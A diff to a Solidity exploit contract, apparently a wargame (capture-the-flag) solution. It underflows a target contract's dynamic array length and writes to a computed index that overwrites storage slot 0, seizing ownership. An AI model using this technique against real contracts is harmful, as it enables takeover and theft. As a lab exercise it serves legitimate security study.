@@ -1,5 +1,3 @@
-// see https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/ for memory explanation
-
 // Slot 0 = 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
 //         |      24 nibbles=12bytes |  40 nibbles = 20bytes                  |
 //         |      11bytes| boolean contacted |  20bytes owner                 |
@@ -14,29 +12,29 @@
 // AIM is to replace storage slot 1 with our address:
 // 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1
 
-pragma solidity ^0.6.0;
+pragma solidity ^0.5.0;
 
 interface ICodex {
     function make_contact() external;
 
-    function record(bytes32 _content) external contacted;
+    function record(bytes32 _content) external;
 
-    function retract() external contacted;
+    function retract() external;
 
-    function revise(uint256 i, bytes32 _content) external contacted;
+    function revise(uint256 i, bytes32 _content) external;
 }
 
 contract AttackCodex {
     ICodex level; 
-    constructor(){
-        level = ICodex("0x59CB0A4babd506be33EA0db70b937a8A4Dd5DfD7"));
+    constructor() public {
+        level = ICodex(address(0x59CB0A4babd506be33EA0db70b937a8A4Dd5DfD7));
     }
 
-    attack(){
+    function attack() public {
         // pass the modifier
-        level.make_contact()
+        level.make_contact();
         // overflow the codex length
-        level.retract()
+        level.retract();
         // now we need to modify slot 0.
         // the equation that governs this for a dynamic array at slot 1 is:
         // slot number = uint256(keccak(1)) + N  = 0 
@@ -44,7 +42,7 @@ contract AttackCodex {
         // uint256(keccak(1)) + N = 2^256
         // N = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(web3.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001'))).toString()
         // N = '35707666377435648211887908874984608119992236509074197713628505308453184860938'
-        
+          
         uint256 N = 35707666377435648211887908874984608119992236509074197713628505308453184860938;
         bytes32 content = 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1;
         level.revise(N, content);
